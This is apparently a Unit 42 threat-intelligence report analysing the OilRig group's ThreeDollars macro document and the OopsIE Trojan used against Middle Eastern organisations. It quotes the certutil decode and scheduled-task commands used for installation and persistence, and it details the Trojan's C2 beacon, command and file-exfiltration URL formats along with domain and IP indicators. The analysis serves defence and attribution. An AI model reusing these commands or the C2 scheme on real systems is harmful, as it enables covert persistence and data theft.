OilRig Uses ThreeDollars to Deliver New Trojan\n\n**[researchcenter.paloaltonetworks.com/2018/02/unit42-oopsie-oilrig-uses-threedollars-deliver-new-trojan/](https://researchcenter.paloaltonetworks.com/2018/02/unit42-oopsie-oilrig-uses-threedollars-deliver-new-trojan/)**\n\nBryan Lee, Robert Falcone February 23, 2018\n\nBy [Bryan Lee and](https://unit42.paloaltonetworks.com/author/bryanlee/) [Robert Falcone](https://unit42.paloaltonetworks.com/author/robertfalcone/)\n\nFebruary 23, 2018 at 5:00 AM\n\n[Category: Unit 42](https://unit42.paloaltonetworks.com/category/unit42/)\n\nTags: [ConfuserEx,](https://unit42.paloaltonetworks.com/tag/confuserex/) [OilRig,](https://unit42.paloaltonetworks.com/tag/oilrig/) [OopsIE,](https://unit42.paloaltonetworks.com/tag/oopsie/) [SmartAssembly](https://unit42.paloaltonetworks.com/tag/smartassembly/)\n\nThis post is also available in: 日本語 [(Japanese)](https://unit42.paloaltonetworks.jp/unit42-oopsie-oilrig-uses-threedollars-deliver-new-trojan/)\n\nThe [OilRig group remains highly active in their attack campaigns while they continue to](https://blog.paloaltonetworks.com/tag/oilrig/)\nevolve their toolset. On January 8, 2018, Unit 42 observed the OilRig threat group carry out\nan attack on an insurance agency based in the Middle East. Just over a week later, on\nJanuary 16, 2018, we observed an attack on a Middle Eastern financial institution. In both\nattacks, the OilRig group attempted to deliver a new Trojan that we are tracking as OopsIE.\n\n[The January 8 attack used a variant of the ThreeDollars delivery document, which we](https://blog.paloaltonetworks.com/tag/threedollars/)\n[identified as part of the OilRig toolset based on attacks that occurred in August 2017.](https://blog.paloaltonetworks.com/2017/10/unit42-oilrig-group-steps-attacks-new-delivery-documents-new-injector-trojan/)\nHowever, the attack on January 16 did not involve ThreeDollars at all. Instead, this attack\ninvolved delivering the OopsIE Trojan directly to the victim, most likely using a link in a spear\nphishing email. Interestingly, the targeted organization in the January 16 attack had already\nbeen targeted by the OilRig group a year ago on January 2017. This repeat attack may\nsuggest that the adversaries have lost their foothold in the targeted organization, or that it\nmay be considered a high value target.\n\n\n-----\n\nA New Attack\nOn January 8, 2018, the OilRig threat group sent an email with the subject Beirut Insurance\nSeminar Invitation to an insurance agency in the Middle East. The OilRig group sent two\nemails to two different email addresses at the same organization within a six minutes time\nspan. The recipient email addresses suggest they may be the addresses used for specific\nregional branches of the targeted organization.\nBoth emails originated from the same address. The email address is associated with the\nLebanese domain of a major global financial institution. However, based upon the captured\nsession data, it is highly likely the source email address was spoofed. The email contained\nan attachment named Seminar-Invitation.doc, which is a malicious Microsoft Word document\nwe track as ThreeDollars. Examining this sample of ThreeDollars reveals that it contains a\nnew payload, which we have named OopsIE.\nIn the January 16, 2018 attack, we observed OilRig attacking an organization it previously\ntargeted in January 2017. In this case, the ThreeDollars delivery document was not used and\ninstead an attempt was made to deliver the OopsIE Trojan directly to the targeted\norganization, likely via a link within an email. The Trojan was directly downloaded from the\ncommand and control server for OopsIE, signifying that this server was also used for staging.\nThis suggests that due to the January 2017 attack, the targeted organization may have taken\nactions to counter known OilRig TTPs, in this case delivering malicious macro documents,\ncausing the OilRig operators to adopt a different delivery tactic.\nWe also identified another sample of ThreeDollars, created on January 15, 2017 with the file\nname strategy preparation.dot. While this sample was very similar to the SeminarInvitation.doc sample it also had some significant differences. The primary difference was\nthat this sample was encrypted and password protected, requiring the victim to enter in a\npassword which was likely provided by the adversary to view the document. While this is not\na new tactic, this is the first instance where we have observed the OilRig using it in their\nplaybook. Typically, password protected documents is commonly used by adversaries as an\nevasion tactic to bypass automated analysis mechanisms due to the password requirement\nfor successful execution. As we have observed throughout our tracking of the OilRig group,\nadopting proven tactics has been a common behavior over time.\n\nThreeDollars Document Analysis\nThe samples of ThreeDollars we collected in these attacks are structurally very similar to the\n[first sample we analyzed in October 2017, down to the lure image used to trick the recipient](https://blog.paloaltonetworks.com/2017/10/unit42-oilrig-group-steps-attacks-new-delivery-documents-new-injector-trojan)\ninto clicking the “Enable Content” button to execute the malicious macro. The images used in\nthe January 2018 attacks were the exact same in each sample, verified by file hash.\nFigure 1 shows the lure image extracted from the newer attacks, and the lure image from the\n\n\n-----\n\nfirst sample we analyzed. While it is unsurprising that attacks originating from the same\nadversary group would use the same resource over time, we analyzed exactly how similar\nthese lure images were.\n\n_Figure 1 Side-by-side of the lure images within ThreeDollars in the October 2017 and the_\n_January 2018 attacks_\n\nSuperficially, we can immediately see the images are quite similar, but with some glaring\ndifferences. The image from the August 2017 attack for example, is significantly larger, using\nan image resolution of 3508 pixels x 4961 pixels which is also the exact resolution for a\nsheet of A3 paper at 300 dpi. It also contains some additional artifacts in the image, such as\nthe inclusion of the Microsoft logo as well as additional text, specifically “against\nunauthorized use”. In comparison, the newer lure image appears to be horizontally distorted\ndue to it being resized to fit into the constraints of the document. In addition, the period after\n“This document is protected” is misaligned.\n\nBy overlaying these two lure images and accounting for the newer image’s distortion, we are\nable to clearly visualize that the newer image is highly likely to be a cropped and edited\nversion of the August 2017 image.\n\n\n-----\n\nExamining the color code used in both images also shows they are the exact same,\n#da3b01. The dimensions of the newer image are roughly 40% of the older October image,\nsuggesting that after cropping and editing the newer image, the creator is also likely to have\nresized the image. One peculiar artifact from the original image is the usage of the “st”\n[(unicode \\uFB06) ligature in the word “against”. This is a highly uncommon glyph and is not](https://en.wikipedia.org/wiki/Typographic_ligature)\ngenerally available in standard keyboard layouts. This may suggest that the string was\nmachine generated rather than directly inputted from a keyboard. The use of this glyph also\nmay suggest that the actor is not a native English speaker.\n\nMalicious Macro Analysis\n\nWhen the victim opens the ThreeDollars document they are presented with the lure image\nand prompted to click on the “Enable Content” button. When button is clicked, a malicious\nmacro is silently run which installs then executes a payload on a system. A decoy image is\nalso displayed to the victim to lower suspicion of malicious activity. The decoy message that\nis eventually presented to the victim does not actually show the expected content of an\ninsurance seminar invitation as presented in the delivery email. Instead, it displays a fake\nerror message of NullRefrencedException! error has occurred in user32.dll by 0x32ef2121\nwithin the Word document, as seen in Figure 2.\n\n\n-----\n\n_Figure 2 Decoy message displayed by the malicious macro in ThreeDollars delivery_\n_document_\n\nWhile the decoy in Figure 2 is displayed, the macro will search the document for the delimiter\n###$$$ and write the base64 encoded text that follows this delimiter to the file\n%APPDATA%\\Base.txt. The macro then creates a scheduled task named SecurityAssist that\nruns after waiting one minute. The SecurityAssist task is responsible for running the following\ncommand line command that uses the Certutil application to decode the base64 encoded\ndata in Base.txt and saves the decoded data to the file\n%PROGRAMDATA%\\IntelSecurityAssistManager.exe:\ncmd.exe /c Certutil -decode %appdata%\\Base.txt\n%programdata%\\IntelSecurityAssistManager.exe & SchTasks /Delete /F /TN SecurityAssist\nThe macro also creates a second scheduled task named Conhost that waits two minutes and\nruns a VBScript %APPDATA%\\chkSrv.vbs. The macro saves the chkSrv.vbs script to the\nsystem, which is responsible for running the IntelSecurityAssistManager.exe payload\n(OopsIE Trojan) and cleaning up the installation by deleting the two scheduled tasks, the\nBase.txt file, the ThreeDollars document, and the chkSrv.vbs script.\n\nOopsIE Trojan Analysis\nThe OopsIE Trojan delivered in these attacks is packed with SmartAssembly and further\nobfuscated with ConfuserEx v1.0.0. To run persistently on the system, the Trojan will first\ncreate a VBScript file:\nSpecialFolder.CommonApplicationData\\srvResesponded.vbs\nthat contains:\nCreateObject(\"WScript.Shell\").Run(\"%app%\")\nThe Trojan replaces the %app% string in the above VBScript with the path to its executable.\nFinally, the Trojan creates a scheduled task to run itself every three minutes by running the\nfollowing command on the command prompt after replacing the %path% string with the path\nto the srvResesponded.vbs VBScript:\nSchTasks /Create /SC MINUTE /MO 3 /TN \"InetlSecurityAssistManager\" /TR \"wscript\n%path%\" /f\nThe Trojan uses HTTP to communicate with its C2 server, specifically using the\nInternetExplorer application object within an embedded Microsoft .NET Framework assembly\ncalled Interop.SHDocVw. The Trojan extracts and loads this embedded assembly by\nconcatenating the contents of two resources named S1 and S2 and decompresses the\nresulting data using the GZipSteam class. The resulting Interop.SHDocVw .NET assembly is\npacked with SmartAssembly and further obfuscated using Confuser v1.9.0.0. The\nconcatenation of resources to construct embedded assemblies is not a new technique for the\n[OilRig group as they used the very same technique in October 2017 in their ISMInjector tool](https://blog.paloaltonetworks.com/2017/10/unit42-oilrig-group-steps-attacks-new-delivery-documents-new-injector-trojan/)\n\n\n-----\n\nto construct its embedded libraries Joiner.dll and Inner.dll.\nBy using the InternetExplorer application object, all C2 related requests will look as if they\ncame from the legitimate browser and therefore will not contain any anomalous fields within\nthe request, such as custom User-Agents. The OopsIE Trojan is configured to use a C2\nserver hosted at:\nwww.msoffice365cdn[.]com\nThe Trojan will construct specific URLs to communicate with the C2 server and parses the\nC2 server's response looking for content within the tags <pre> and </pre>. The initial HTTP\nrequest acts as a beacon, as shown in the image below.\n\nAs seen in the above request, the Trojan will generate a URL for its beacon with the\nfollowing structure:\n\nhttp://<c2 domain>/chk?<hex(Environment.UserName/Environment.MachineName)>\n\nThe Trojan will issue a request to this URL to check (hence the chk string in the URL) to see\nif the C2 server has a command for the Trojan to run. The C2 server will respond to the\nTrojan’s request by echoing the value\n<hex(Environment.UserName/Environment.MachineName)> if it wishes to provide additional\ncommands. If the C2 server does not respond with the appropriate echoed data, the Trojan\nwill create a file named srvCheckresponded.tmp in the\nSpecialFolder.CommonApplicationData folder and write nothing to it before exiting.\n\nIf the C2 server provides the appropriate echoed data in the response, the Trojan attempts to\ndetermine what commands the C2 wishes to run by issuing a request to the following URL:\n\nhttp://<c2 domain>/what?<hex(Environment.UserName/Environment.MachineName)>\n\nAfter issuing the what command, the Trojan will parse the C2's response for the string Oops,\nwhich the Trojan will treat as the C2 making a mistake and will exit. Otherwise, the Server\nwill respond with a command followed by a set of parameters, split up by the delimiter <>:\n\n[command]<>[parameters for command in hexadecimal format]\n\nThe available commands are:\n\n**Command** **Description**\n\n1 Run command\n\n\n-----\n\n2 Upload a file\n\n3 Download a specified file\n\nThe parameters for each command are issued in hexadecimal format. For instance, the\ncharacter A would be represented by the two characters 41, which is the hexadecimal\nrepresentation of that character. This hexadecimal format is used extensively throughout this\nTrojan.\n\nThe run command (1) creates the process cmd.exe /c with the command parameters\nappended and will write the output of the command in hexadecimal format to the file\n%APPDATA%\\tmpCa.vbs. The Trojan will then read the hexadecimal formatted contents of\nthis file in 1500 byte blocks, sending each 1500 bytes of data from the file to the C2 server\nvia an HTTP GET request to a URL with the following structure:\n\nhttp://<c2 domain>/resp?\n<hex(Environment.UserName/Environment.MachineName)>AAZ<hex(command prompt\noutput)>\n\nThe upload command (2) writes data provided by the C2 to a specified file. The parameters\nsupplied to this command include hexadecimal values for the binary data and the filename,\nwhich are split up by a delimiter of (!). The Trojan will respond to the C2 to notify it of a\nsuccessful upload by sending a URL structured as follows:\n\nhttp://<c2 domain>/resp?\n<hex(Environment.UserName/Environment.MachineName)>AAZ<hex(\"File Uploaded\")>\n\nThe download command (3) reads the contents of a specified file and sends the data to the\nC2 server. If the file does not exist, the Trojan will send the C2 server a message < File Not\nFound > by sending the following URL:\n\nhttp://<c2 domain>/resp?\n<hex(Environment.UserName/Environment.MachineName)>AAZ<hex(\"< File Not Found >\")>\n\nIf the file exists, the Trojan will read the contents of the specified file and compresses the\ncontents using the GZipStream class. The Trojan then gets the hexadecimal values of the\ncompressed data and will replace the following hexadecimal values on each line with ASCII\ncharacters to further compressed the data:\n\n**String of hexadecimal values** **Character replacement**\n\n000000 z\n\n00000 x\n\n0000 y\n\n000 g\n\n\n-----\n\n00 w\n\n01 t\n\nThe Trojan then writes 1500 bytes of the hexadecimal formatted data, one per line to a\ntemporary file in the SpecialFolder.CommonApplicationData folder named as:\n\n<day><hour><second><millisecond>.tmp\n\nThe Trojan will then read each line from this temporary file and send them to the C2 server\nby issuing requests to a URL structured as follows:\n\nhttp://<c2 domain>/resp?\n<hex(Environment.UserName/Environment.MachineName)>ABZ<hex(1500 characters of\nhexadecimal formatted file contents)>\n\nOnce all of the lines of hexadecimal formatted data in the temporary file are sent to the C2\nserver, the Trojan will send a request to the C2 server to notify the data has been\nsuccessfully transmitted via a URL structured as follows:\n\nhttp://<c2 domain>/resp?\n<hex(Environment.UserName/Environment.MachineName)>ABZFinish\n\nOverlaps with Previous OilRig Group Attacks\n\nSince May 2016, we have continued to monitor and uncover various attacks and tools\nassociated with the OilRig group. As we discover new tools used by this group, we have\nconsistently discovered overlapping artifacts with previously used tools and infrastructure.\nThis type of commonality is unsurprising as we are assuming a single adversary, and is an\nexcellent example of how adversaries will often times reuse certain tactics and techniques\nwhether it is for efficiencies sake or sheer laziness.\n\nIn the attacks described above, we observed a new payload being delivered using a\npreviously unknown command and control domain. However, as we continued to follow the\ntrail of evidence, we found immediate links to past attacks and common artifacts from the\nOilRig group. The most obvious link is the reuse of the ThreeDollars delivery document,\nwhich we had previously observed delivering a different payload. However, we also found\nother connection to other OilRig group attacks starting with the command and control\ndomain, msoffice365cdn[.]com.\n\nBeginning with the WHOIS record, we see that the domain was registered by\nemilia.jones@mail.ru. Examining additional domains registered to this email address reveals\nthe domain office365-management[.]com, which we previously identified in October 2017 to\nbe an OilRig C2. Continuing to examine the WHOIS records, we see that a fairly unique\nphone number is also used in the record. It is only found in one other WHOIS record, for the\ndomain office365-technical[.]info, which is registered to leonard.horner@mail.ru. Based off\n\n\n-----\n\nthe relational links and thematic similarity of the domain name, we have strong reason to\nbelieve this domain and registrant are also attributed to the OilRig group.\nMoving onto IP resolutions of the identified domains proves to be fruitful as well.\nMsoffice365cdn[.]com resolves to 80.82.79.221, which resides on the same class C network\nrange as the IP resolution of office365-technical[.]info, which resolves to 80.82.79.240. In\naddition, we find that 80.82.79.221 shares an SSL certificate with a small number of other IP\naddresses, one of which is 185.162.235.29. This IP resolves to office365-management[.]com\nwhich was one of the domains registered by the emilia.jones@mail.ru entity. Inspecting the\nclass C network for 185.162.235.0/24 shows us that another IP on the same network\nresolves to an OilRig domain, msoffice-cdn[.]com which we identified in August 2017.\nLastly, we examine the delivery document itself. Although we have already identified the\ndocuments as a variant of the ThreeDollars tool and analyzed the lure image used in this\ndocument in comparison to the previously used lure image, additional artifacts also exist to\nfurther strengthen the relational link of this sample and the attack to previous OilRig\nattributed tools and attacks. In this case, one of the ThreeDollars samples we collected\ncontained a unique author name of J-Win-7-32-Vm. We had previously observed this author\nname in use once before, in the very first ThreeDollars document we collected that we had\nreported on in August 2017.\n\nConclusion\n\nThe OilRig group continues to remain a highly active adversary in the Middle East region.\nThis group has repeatedly shown evidence of a willingness to adapt and evolve their tactics,\nwhile also reusing certain aspects as well. We have now observed this adversary deploy a\nmultitude of tools, with each appearing to be some form of iterative variation of something\nused in the past. However, although the tools themselves have morphed over time, the plays\nthey have executed in their playbook largely remain the same when examined over the\n\n\n-----\n\nattack life cycle. We have added this play to the OilRig playbook, which can be viewed online\n[via our Playbook Viewer.](https://pan-unit42.github.io/playbook_viewer/)\nPalo Alto Networks customers are protected from this threat by:\n\n1.
